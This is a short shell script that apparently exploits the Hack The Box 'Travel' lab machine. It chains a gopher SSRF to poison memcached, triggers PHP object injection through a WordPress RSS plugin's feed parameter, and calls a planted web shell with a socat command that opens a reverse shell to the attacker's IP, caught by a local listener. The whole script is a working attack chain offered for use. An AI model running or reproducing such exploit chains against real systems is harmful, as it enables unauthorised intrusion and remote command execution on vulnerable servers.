#!/bin/sh

# Get our IP on HTB
htbip=$(ifconfig | grep "destination 10.10" | sed 's/.*destination //')
echo "htb ip ${htbip}"

feed_url="http://${htbip}/feed.html"
payload_url=$(php gen-payload-only.php ${feed_url})
echo "setting memcached value via gopher ${payload_url}"
curl --silent "http://blog.travel.htb/awesome-rss/?custom_feed_url=${payload_url}" > /dev/null
echo "sending request for for feed url to initiate object injection..."
curl --silent "http://blog.travel.htb/awesome-rss/?custom_feed_url=${feed_url}" > /dev/null
echo "using created file to initiate reverse shell..."
curl --silent "http://blog.travel.htb/wp-content/themes/twentytwenty/logs/rs.php?1=socat%20exec%3A%27bash%20%2Dli%27%2Cpty%2Cstderr%2Csetsid%2Csigint%2Csane%20tcp%3A${htbip}%3A22473" & > /dev/null
socat file:`tty`,raw,echo=0 tcp-listen:22473